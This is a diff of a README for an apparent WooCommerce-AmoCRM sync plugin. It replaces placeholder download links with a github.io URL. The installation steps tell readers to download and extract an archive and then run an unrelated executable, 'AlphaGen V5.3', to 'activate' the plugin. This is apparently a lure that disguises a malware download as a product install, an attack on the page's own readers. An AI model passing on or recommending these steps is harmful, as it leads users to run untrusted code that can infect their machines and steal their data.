@@ -2,13 +2,13 @@
 
 Sync WooCommerce orders, customers, and products with AmoCRM using WooAmoConnector — automate sales tracking and CRM updates in real time.
 
-[![Download](https://img.shields.io/badge/Download-WooAmoConnector-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-WooAmoConnector-blueviolet)](https://wooamoconnector-amocrm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://wooamoconnector-amocrm.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate WooAmoConnector features  
 4. ✅ In WordPress, install the WooAmoConnector plugin and connect to your AmoCRM account via API key and domain
